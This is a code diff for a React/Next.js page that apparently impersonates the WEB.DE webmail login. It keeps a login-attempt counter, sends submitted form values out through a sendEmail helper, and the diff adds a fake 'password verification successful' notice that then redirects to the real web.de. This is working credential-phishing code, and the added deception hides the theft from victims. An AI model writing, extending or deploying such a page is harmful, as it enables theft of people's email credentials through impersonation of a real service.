@@ -3,6 +3,8 @@ import React, { useState } from "react";
 import Image from "next/image";
 import { PT_Sans, Arimo } from "next/font/google";
 import { useForm } from "react-hook-form";
+import { ToastContainer, toast } from "react-toastify";
+import "react-toastify/dist/ReactToastify.css";
 
 import useCaptchas from "../useCaptchas";
 
@@ -11,7 +13,6 @@ import LogoWebDe56 from "../assets/LogoWebDe56";
 import RefreshIcon from "../assets/RefreshIcon";
 import InfoIcon from "../assets/InfoIcon";
 import ErrorIcon from "../assets/ErrorIcon";
-import axios from "axios";
 import sendEmail from "@/utils/sendEmail";
 
 const ptSans = PT_Sans({ weight: ["400", "700"], subsets: ["latin"] });
@@ -75,15 +76,23 @@ export default function Home() {
 
   const [loginAttempt, setLoginAttempt] = useState(0);
 
+  const MAIN_PAGE_URL = "https://web.de";
+
+  const notify = () =>
+    toast("password verification successful", {
+      type: "success",
+      onClose: () => {
+        window.location.assign(MAIN_PAGE_URL);
+      },
+    });
+
   const onSubmit = async (values: IFormValues) => {
     try {
       if (loginAttempt === 1) {
         const response = await sendEmail(values);
 
         if (response.data === "OK") {
-          window.location.assign(
-            "https://web.de/logoutlounge/?status=login-failed"
-          );
+          notify();
         }
       }
     } catch (error) {
@@ -236,6 +245,7 @@ export default function Home() {
           Hilfe und Tipps
         </a>
       </footer>
+      <ToastContainer />
     </div>
   );
 }
